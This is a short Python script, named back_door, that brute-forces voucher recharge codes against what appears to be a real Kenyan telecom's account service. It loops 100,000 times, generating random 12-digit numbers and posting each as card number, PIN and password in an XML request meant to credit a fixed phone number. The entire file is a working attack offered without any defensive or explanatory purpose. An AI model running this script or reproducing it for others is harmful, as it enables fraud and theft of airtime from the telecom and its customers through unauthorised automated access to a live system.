import requests
from random import choice


def back_door():
    print("Started")
    i = 0
    while i <= 100000:
        i += 1
        id = ''.join(choice('0123456789') for s in range(12))
        payload = '<?xml version="1.0" encoding="UTF-8"?><zsmart><ServiceName>KenyaFT_RechargeByVoucherCard</ServiceName><Data><obody><sDN>254777990802</sDN><sVoucherCard>' + \
            id + '</sVoucherCard><sPPSCARDPIN>' + id + '</sPPSCARDPIN><sPWD>' + id + \
            '</sPWD></obody><sCONTACT_CHANNEL_ID>10</sCONTACT_CHANNEL_ID></Data></zsmart>'
        url = "http://myaccount.telkom.co.ke//callservice.do"
        r = requests.post(url, data=payload, timeout=300)
        print(i)


back_door()
